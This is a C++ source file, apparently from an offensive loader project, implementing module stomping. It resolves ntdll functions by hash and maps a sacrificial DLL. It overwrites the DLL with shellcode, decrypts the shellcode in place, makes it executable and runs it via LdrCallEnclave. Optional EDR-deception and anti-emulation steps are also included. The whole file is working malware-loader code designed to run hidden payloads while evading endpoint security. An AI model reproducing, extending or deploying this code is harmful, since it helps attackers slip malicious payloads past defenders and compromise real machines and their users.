#include "module_stomping.h"
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cstdint>
#include <iostream>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")

#include "../modules/api_resolver.h"
#include "../modules/loader_stub.h"
#include "../modules/decryptor.h"
#include "../modules/edr_decon.h"
#include "../modules/anti_emulation.h"
#include "../utils/logging.h"
#include "../config.h"

/*============================[Resolve APIs]=====================================================================================================*/

void* ntdllmod = GetModuleHandleA("ntdll.dll");

fnLdrCallEnclave MyCallFunc = (fnLdrCallEnclave)findfunc(ntdllmod, 0x7D2832BF);
fnNtProtectVirtualMemory MyProtectVirtualMem = (fnNtProtectVirtualMemory)findfunc(ntdllmod, 0x696C691D);
fnNtAllocateVirtualMemory MyAllocMem = (fnNtAllocateVirtualMemory)findfunc(ntdllmod, 0x05F5C272);
fnNtUnmapViewOfSection MyUnmapSec = (fnNtUnmapViewOfSection)findfunc(ntdllmod, 0x645F70FA);
fnNtCreateSection MyCreateSection = (fnNtCreateSection)findfunc(ntdllmod, 0xA69EB161);
fnNtMapViewOfSection MyMapViewOfSection = (fnNtMapViewOfSection)findfunc(ntdllmod, 0x27F26EF7);


/*========================================================[Overwrite DLL]=================================================================================*/

namespace Module_Stomping
{

    /*========================================================[Load DLL]=================================================================================*/
    PVOID g_pSacrificialHeaders = nullptr;
    SIZE_T g_sSacrificialHeaderSize = 0;
    
    BOOL LoadDllFile(
        IN LPCWSTR szDllFilePath,
        OUT HMODULE* phModule,
        OUT PVOID* pEntryPoint,
        OUT ULONG_PTR* psImgSize // optional: to know image size
    ) {
        HANDLE hFile = INVALID_HANDLE_VALUE;
        HANDLE hSection = NULL;
        NTSTATUS status = STATUS_SUCCESS;
        ULONG_PTR uMappedModule = NULL;
        SIZE_T sViewSize = 0;
        PIMAGE_NT_HEADERS pImgNtHdrs = NULL;

        if (!szDllFilePath || !phModule || !pEntryPoint)
            return FALSE;

        // Open the DLL on disk
        hFile = CreateFileW(szDllFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            wprintf(L"[-] CreateFileW failed (%d)\n", GetLastError());
            return false;
        }

        // Create a section for the image
        status = MyCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            NULL,
            0,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile
        );
        if (!NT_SUCCESS(status)) {
            wprintf(L"[-] NtCreateSection failed (0x%08X)\n", status);
            return false;
        }

        // Map the image section into memory
        uMappedModule = 0;
        SECTION_INHERIT inheritDisposition = ViewShare;
        status = MyMapViewOfSection(
            hSection,
            NtCurrentProcess(),
            (PVOID*)&uMappedModule,
            0,
            0,
            NULL,
            &sViewSize,
            ViewShare,
            0,
            PAGE_READWRITE // Final perms of the sections mapped in memory
        );
        if (!NT_SUCCESS(status)) {
            wprintf(L"[-] NtMapViewOfSection failed (0x%08X)\n", status);
            return false;
        }

        // Validate image
        auto* pDos = (PIMAGE_DOS_HEADER)uMappedModule;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
            wprintf(L"[-] Invalid DOS header\n");
            goto _FUNC_CLEANUP;
        }

        pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedModule + pDos->e_lfanew);
        if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
            wprintf(L"[-] Invalid NT header\n");
            goto _FUNC_CLEANUP;
        }

		// Success - set out params
        *phModule = (HMODULE)uMappedModule;
        *pEntryPoint = (PVOID)(uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
        if (psImgSize)
            *psImgSize = pImgNtHdrs->OptionalHeader.SizeOfImage;

		// Save sacrificial headers for later use
        g_pSacrificialHeaders = malloc(pImgNtHdrs->OptionalHeader.SizeOfHeaders);
        g_sSacrificialHeaderSize = pImgNtHdrs->OptionalHeader.SizeOfHeaders;

        if (g_pSacrificialHeaders)
            memcpy(g_pSacrificialHeaders, (PVOID)uMappedModule, g_sSacrificialHeaderSize);

        DELETE_HANDLE(hFile);
        DELETE_HANDLE(hSection);
        return TRUE;

    _FUNC_CLEANUP:
        DELETE_HANDLE(hFile);
        DELETE_HANDLE(hSection);
        return (*phModule && *pEntryPoint) ? TRUE : FALSE;;
    }

    /*==================================[HELPERS]==========================================================================================================*/

    // Overwrite the mapped sacrificial DLL with shellcode
    BOOL OverwriteSacrificialDll(
        IN ULONG_PTR uMappedMemory,
        IN SIZE_T sMappedSize,
        IN ULONG_PTR uShellcode,
        IN SIZE_T sShellcodeSize
    ) {
        if (!uMappedMemory || !uShellcode || !sShellcodeSize) {
            printf("[-] Invalid parameters\n");
            return FALSE;
        }

        if (sShellcodeSize > sMappedSize) {
            printf("[-] Shellcode size is larger than mapped memory size\n");
            return FALSE;
        }

        DWORD oldProtect = 0;
        NTSTATUS st = MyProtectVirtualMem(
            GetCurrentProcess(),
            (PVOID*)&uMappedMemory,
            &sMappedSize,
            PAGE_READWRITE,
            &oldProtect
        );

        // Zero out existing memory except for headers
        memset((char*)uMappedMemory + g_sSacrificialHeaderSize, 0, sMappedSize - g_sSacrificialHeaderSize);
        // Copy shellcode to dll after headers 
		memcpy((char*)uMappedMemory + g_sSacrificialHeaderSize, (void*)uShellcode, sShellcodeSize);

        return TRUE;
    }


    /*=======================================================[MODULE OVERLOADING SECTION]==================================================================*/

        // Patch section of a loaded DLL and execute shellcode
    bool PatchSectionAndExecute(LPCWSTR dllPath, const std::vector<uint8_t>& shellcode) {
        HMODULE hMappedDll = NULL;
        PVOID pEntryPoint = NULL;
        ULONG_PTR imageSize = 0;

        // Step 1: Ghost-load the DLL
        if (!LoadDllFile(dllPath, &hMappedDll, &pEntryPoint, &imageSize)) {
            printf("[-] Failed to load DLL using section mapping\n");
            return false;
        }

        printf("[+] DLL mapped at: %p | Image size: 0x%llx | Entry point: %p\n", hMappedDll, imageSize, pEntryPoint);

#if USE_EDR_DECON
		// Step 1.5: EDR Decon
        constexpr size_t kTwentyMB = 20 * 1024 * 1024; // 20 megabytes in bytes
		EDRDecon::DoFakeOverwrites(kTwentyMB);
#endif

        BusySleepMs(1000); // Small delay

        // Step 2: Overwrite sacrificial DLL
        if (!OverwriteSacrificialDll(
            reinterpret_cast<ULONG_PTR>(hMappedDll),
            imageSize,
            reinterpret_cast<ULONG_PTR>(shellcode.data()),
            shellcode.size()))
        {
            printf("[-] Failed to overwrite sacrificial DLL\n");
            return false;
        }

        printf("[+] DLL overwritten in place\n");


		// Step 3: Flip to RW
        ULONG oldProtect = 0;
        NTSTATUS st = MyProtectVirtualMem(
            GetCurrentProcess(),
            (PVOID*)&hMappedDll,
            &imageSize,
            PAGE_READWRITE,
            &oldProtect
        );

        // Set pointer for decryption after the headers
		handle_t decryptionPtr = reinterpret_cast<uint8_t*>(hMappedDll) + g_sSacrificialHeaderSize;

        // Step 4: Decrypt in-place
#if USE_DECRYPTION
        if (!Decryptor::DecryptInPlace(reinterpret_cast<uint8_t*>(decryptionPtr), shellcode.size())) {
            printf("[-] Decryption failed\n");
            return false;
        }
        printf("[+] Shellcode decrypted in-place at %p\n", decryptionPtr);
#endif



        // Step 5: Change permissions to RX
        SIZE_T regionSize = shellcode.size();
		handle_t hMappedDLL = hMappedDll;
        st = MyProtectVirtualMem(
            GetCurrentProcess(),
            (PVOID*)&decryptionPtr,
            &regionSize,
            PAGE_EXECUTE_READ,
            &oldProtect
        );

        if (st != 0) {
            printf("[-] NtProtectVirtualMemory failed: 0x%X\n", st);
            return false;
        }

        FlushInstructionCache(GetCurrentProcess(), decryptionPtr, regionSize);

        printf("[+] Shellcode written and memory set to RX. Executing...\n");

        // Step 6: Execute using LdrCallEnclave
        PVOID param = nullptr;
        st = MyCallFunc(
            (PENCLAVE_ROUTINE)decryptionPtr,
            0,
            &param
        );

        if (st != 0) {
            printf("[-] LdrCallEnclave failed with status: 0x%X\n", st);
            return false;
        }

        return true;
    }
}; // namespace Module_Stomping